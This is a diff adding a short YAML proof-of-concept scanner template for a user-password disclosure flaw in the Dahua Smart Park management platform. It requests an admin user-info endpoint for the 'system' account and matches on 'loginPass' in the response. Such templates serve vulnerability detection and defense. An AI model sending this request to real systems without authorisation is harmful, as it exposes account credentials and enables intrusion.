@@ -1,0 +1,9 @@
+name: poc-yaml-大华智慧园区综合管理平台-userleak
+description: "用户密码泄露"
+method: GET
+path:
+  - /admin/user_getUserInfoByUserName.action?userName=system
+expression:
+  status: 200
+  body_all:
+    - "loginPass"
